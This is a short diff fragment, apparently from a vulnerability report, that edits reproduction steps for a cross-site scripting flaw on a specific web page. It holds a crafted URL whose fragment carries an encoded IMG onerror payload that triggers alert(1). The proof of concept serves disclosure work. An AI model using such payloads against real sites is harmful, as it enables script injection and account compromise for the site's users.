@@ -18,7 +18,7 @@ http://kzlabs.com/66.php
 
 1. Enter the crafted URL
 ```
- https://kzlabs.com/66.php#send-transaction=%3CIMG%20SRC=x%20onERROR=alert(1)%3E
+ http://kzlabs.com/66.php#send-transaction=%3CIMG%20SRC=x%20onERROR=alert(1)%3E
 ```
 
 2.Wait for the page to load 
